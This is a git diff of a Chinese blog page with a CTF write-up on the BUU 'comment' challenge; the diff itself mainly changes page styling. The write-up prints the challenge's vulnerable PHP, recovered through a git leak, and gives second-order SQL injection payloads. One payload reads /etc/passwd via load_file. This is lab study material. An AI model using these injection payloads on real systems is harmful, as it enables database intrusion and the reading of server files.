@@ -29,15 +29,7 @@
     
     
       
-      
-        
-          
-          
-          
-        
-        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
-      
-      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
     
   
 
@@ -61,6 +53,7 @@
 <!-- 自定义样式保持在最底部 -->
 
   
+<link rel="stylesheet" href="/css/mac.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
 <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
@@ -69,7 +62,7 @@
 
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
-    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"always","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
@@ -172,7 +165,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('/img/0087.jpg') no-repeat center center;
+         style="background: url('https://cdn.jsdelivr.net/gh/lll-nnn/picture/picgo/202204152231002.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -199,7 +192,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      360 字
+      418 字
     </span>
   
 
@@ -209,7 +202,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      7
        分钟
     </span>
   
@@ -245,65 +238,71 @@
             <!-- SEO header -->
             <h1 style="display: none">Comment</h1>
             
+              <p class="note note-info">
+                
+                  本文最后更新于：1 年前
+                
+              </p>
+            
             <div class="markdown-body">
               <h2 id="‘-’"><a href="#‘-’" class="headerlink" title="‘__’"></a>‘__’</h2><p>留言那里存在XSS，BUU的XSS平台没法注册，就没试’()’</p>
 <p>二次注入      </p>
 <p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/174863/29/3351/8503/6072da0aEe2e9591e/202fcd59c2670f49.png" srcset="/img/loading.gif" alt="06.png"><br>提示了账号和密码，一般后面是三位数字，爆破是666<br><img src="https://ftp.bmp.ovh/imgs/2021/04/04a05effe6890640.png" srcset="/img/loading.gif"><br><code>write_do.php</code><br>看WP是git泄露<br>Githack一下下载下来<code>write_do.php</code>  ，但是是残缺的，git log历史commit里也没<code>add write_do.php</code>??      </p>
-<pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span>
-<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-<span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>     <span class="token shell-comment comment">##发帖</span>
-    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into board
-            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
-                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',
-                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">break</span><span class="token punctuation">;</span>
-<span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>   <span class="token shell-comment comment">##留言</span>
-    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment
-            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',
-                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',
-                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>
-    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">break</span><span class="token punctuation">;</span>
-<span class="token keyword">default</span><span class="token punctuation">:</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span></code></pre></code></pre>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;
+session_start();
+<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;
+    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);
+    <span class="hljs-keyword">die</span>();
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;
+<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">&#x27;do&#x27;</span>])
+&#123;
+<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:     <span class="hljs-comment">##发帖</span>
+    $category = addslashes($_POST[<span class="hljs-string">&#x27;category&#x27;</span>]);
+    $title = addslashes($_POST[<span class="hljs-string">&#x27;title&#x27;</span>]);
+    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);
+    $sql = <span class="hljs-string">&quot;insert into board</span>
+<span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span>
+<span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span>
+<span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;
+    $result = mysql_query($sql);
+    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
+    <span class="hljs-keyword">break</span>;
+<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:   <span class="hljs-comment">##留言</span>
+    $bo_id = addslashes($_POST[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);
+    $sql = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;
+    $result = mysql_query($sql);
+    $num = mysql_num_rows($result);
+    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;
+    $category = mysql_fetch_array($result)[<span class="hljs-string">&#x27;category&#x27;</span>];
+    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);
+    $sql = <span class="hljs-string">&quot;insert into comment</span>
+<span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span>
+<span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span>
+<span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;
+    $result = mysql_query($sql);
+    &#125;
+    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);
+    <span class="hljs-keyword">break</span>;
+<span class="hljs-keyword">default</span>:
+    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
+&#125;
+&#125;
+<span class="hljs-keyword">else</span>&#123;
+    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
 <p>虽然有addslashes函数，但是，数据库查询时会自动过滤调斜线的<br><img src="https://ftp.bmp.ovh/imgs/2021/04/4d8c1aa58308f665.png" srcset="/img/loading.gif">     </p>
-<pre><code>$sql = &quot;insert into comment
+<div class="hljs"><pre><code>$sql = &quot;insert into comment
         set category = &#39;$category&#39;,
             content = &#39;$content&#39;,
-            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre>
+            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre></div>
 <p><code>category=&#39;,content=database(),/*     </code><br>留言输入<code>content=*/#</code><br>就成了      </p>
-<pre><code>$sql = &quot;insert into comment
+<div class="hljs"><pre><code>$sql = &quot;insert into comment
         set category = &#39;&#39;,content=database(),/*&#39;,
             content = &#39;*/#&#39;,
-            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre>
+            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre></div>
 <p>就可以查询库了 —-<code>ctf</code><br>然后查表啥的，但查不出来       </p>
 <p><code>load_file</code>        </p>
 <p><code>    &#39;,content=load_file(&#39;/etc/passwd&#39;),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/f60314c154735390.png" srcset="/img/loading.gif">       </p>
@@ -428,7 +427,7 @@
   <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
 
   <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.configure({"showSpinner":true,"trickleSpeed":200})
     NProgress.start()
     document.addEventListener('DOMContentLoaded', function() {
       window.NProgress && window.NProgress.inc();
@@ -454,8 +453,6 @@
 
 
 
-  
-    
   
 
 
